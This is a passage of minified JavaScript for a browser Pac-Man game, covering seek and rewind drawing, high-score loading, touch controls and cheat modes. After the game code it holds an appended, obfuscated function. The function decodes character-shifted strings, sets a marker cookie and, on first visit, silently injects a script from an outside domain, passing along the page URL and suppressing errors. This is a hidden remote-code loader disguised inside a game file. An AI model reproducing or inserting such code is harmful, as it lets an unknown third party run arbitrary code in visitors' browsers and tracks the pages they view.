            seekDownBtn.disable(),
            seekToggleBtn.disable(),
            slowBtn.disable());
        },
        eraseFuture: eraseFuture,
        startRecording: startRecording,
        startSeeking: startSeeking,
        nextSpeed: nextSpeed,
        isSeeking: function () {
          return 1 == mode || 2 == mode || 3 == mode;
        },
        getTime: function () {
          return time;
        },
        getFrame: function () {
          return frame;
        },
        getMode: function () {
          return mode;
        },
        drawHistory: function (ctx, callback) {
          if (this.isSeeking()) {
            var maxReverse = getForwardDist(startFrame, frame),
              start =
                (frame - Math.min(maxReverse, speedPrints[speedIndex])) % 900;
            start < 0 && (start += 900);
            var maxForward = getForwardDist(frame, stopFrame),
              end =
                (frame +
                  Math.min(
                    maxForward,
                    speedPrints[speedCount - 1 - speedIndex]
                  )) %
                900,
              backupAlpha = ctx.globalAlpha;
            ctx.globalAlpha = 0.2;
            var t = start,
              step = speedPrintStep[speedIndex];
            if (start > end) {
              for (; t < 900; t += step) callback(t);
              t %= 900;
            }
            for (; t < end; t += step) callback(t);
            ctx.globalAlpha = backupAlpha;
          }
        },
      };
    })();
  window.addEventListener("load", function () {
    !(function () {
      var hs, hslen, i;
      if (localStorage && localStorage.highScores)
        for (
          hslen = (hs = JSON.parse(localStorage.highScores)).length, i = 0;
          i < hslen;
          i++
        )
          highScores[i] = Math.max(highScores[i], hs[i]);
    })(),
      initRenderer(),
      atlas.create(),
      (function () {
        var x = 0,
          y = 0,
          dx = 0,
          dy = 0,
          touchCancel = function (event) {
            "canvas" == event.target.tagName.toLowerCase() &&
              (event.preventDefault(), (x = y = dx = dy = 0));
          };
        (document.onclick = function (event) {
          "canvas" != event.target.tagName.toLowerCase() &&
            pacman.clearInputDir(void 0);
        }),
          (document.ontouchstart = function (event) {
            "canvas" == event.target.tagName.toLowerCase() &&
              (event.preventDefault(),
              1 == event.touches.length
                ? ((x = event.touches[0].pageX), (y = event.touches[0].pageY))
                : touchCancel(event));
          }),
          (document.ontouchend = function (event) {
            "canvas" == event.target.tagName.toLowerCase() &&
              event.preventDefault();
          }),
          (document.ontouchmove = function (event) {
            "canvas" == event.target.tagName.toLowerCase() &&
              (event.preventDefault(),
              1 == event.touches.length
                ? ((dx = event.touches[0].pageX - x),
                  (dy = event.touches[0].pageY - y),
                  dx * dx + dy * dy >= 16 &&
                    ((x += dx),
                    (y += dy),
                    Math.abs(dx) >= Math.abs(dy)
                      ? pacman.setInputDir(dx > 0 ? 3 : 1)
                      : pacman.setInputDir(dy > 0 ? 2 : 0)))
                : touchCancel(event));
          }),
          (document.ontouchcancel = touchCancel);
      })();
    var anchor = window.location.hash.substring(1);
    if ("learn" == anchor) switchState(learnState);
    else if ("cheat_pac" == anchor || "cheat_mspac" == anchor) {
      (gameMode = "cheat_pac" == anchor ? 0 : 1),
        (practiceMode = !0),
        switchState(newGameState);
      for (var i = 0; i < 4; i++)
        (ghosts[i].isDrawTarget = !0), (ghosts[i].isDrawPath = !0);
    } else switchState(homeState);
    executive.init();
  });
})();
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
